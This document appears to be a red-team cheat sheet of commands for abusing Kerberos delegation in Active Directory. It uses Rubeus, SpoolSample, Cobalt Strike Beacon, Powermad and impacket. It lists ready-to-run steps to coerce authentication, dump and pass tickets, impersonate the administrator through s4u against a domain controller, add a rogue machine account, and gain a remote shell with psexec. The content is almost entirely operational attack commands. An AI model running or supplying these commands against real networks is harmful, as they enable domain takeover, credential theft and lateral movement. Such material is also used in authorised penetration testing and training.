### Unconstrained Delegation
```
PsExec64.exe -accepteula -s -i cmd.exe
Rubeus.exe monitor /interval:1 /nowrap

PsExec64.exe -accepteula -s -i cmd.exe
SpoolSample.exe DC Current Workstation which is configured with Unconstrained Delegation
SpoolSample.exe DC01.Activebreach.io John-activebreach.io
Rubues.exe ptt /ticket:base64Her

```

### From From Beacon (Cobalt Strike)
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\NyaMeeEain\Desktop\Tools\rubeus.exe triage
execute-assembly C:\Users\NyaMeeEain\Desktop\Tools\rubeus.exe dump /luid:0x44e8a2a
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```

### Constrained Delegation

```
Rubeus.exe s4u /user:John-activebreach.io /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /domain:activebreach.io /dc:10.10.10.10 /ptt
Rubeus.exe s4u /user:John-activebreach.io$ /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /domain:activebreach.io /dc:10.10.10.10 /ptt
Rubeus.exe s4u /user:John-activebreach.io$ /rc4: /impersonateuser:administrator /msdsspn:host/DC01.Activebreach.io /domain:activebreach.io /dc:10.10.10.10 /ptt
```

### From Linux to Gain Shell
```
impacket-ticketConverter cif_cifs_John-activebreach.io.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
proxychains impacket-psexec -k -no-pass -target-ip 10.10.10.110 -dc-ip 10.10.10.10 John-activebreach.io
```

### From From Beacon (Cobalt Strike)
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt 
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:John_PC$ /msdsspn:cifs/fs-1.insomnia.io /ticket:
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:MeMe /msdsspn:cifs/fs-1.insomnia.io /altservice:cifs /ticket:
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```
### Resource Based Constrained Delegation
If computer account is delegated to Resource Based Constrained Delegation, $ need to be added.
```
Rubeus.exe s4u /user:John-activebreach.io$ /rc4:<> /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /ptt  /domain:activebreach.io /dc:10.10.10.10 /outfile:cif.kirbi
Rubeus.exe s4u /user:John-activebreach.io /rc4:<> /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /ptt  /domain:activebreach.io /dc:10.10.10.10 /outfile:cif.kirbi
dir \\DC01.Activebreach.io\c$

impacket-ticketConverter cif_cifs_John-activebreach.io.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
proxychains impacket-psexec -k -no-pass -target-ip 10.10.10.110 -dc-ip 10.10.10.10 John-activebreach.io
```

### Adding Computer Account
```
Import-Module .\Powermad.psd1
New-MachineAccount -Domain activebreach.io -DomainController 10.10.10.10 -MachineAccount Alice -Password (ConvertTo-SecureString 'Password!@#' -AsPlainText -Force) -Verbose
Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
Set-ADComputer Alice.activebreach.io -PrincipalsAllowedToDelegateToAccount Alice$ -Verbose
Rubeus.exe s4u /user:Alice$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/Alice.activebreach.io /impersonateuser:Administrator /ptt
Enter-PSSession -ComputerName Alice.activebreach.io
```

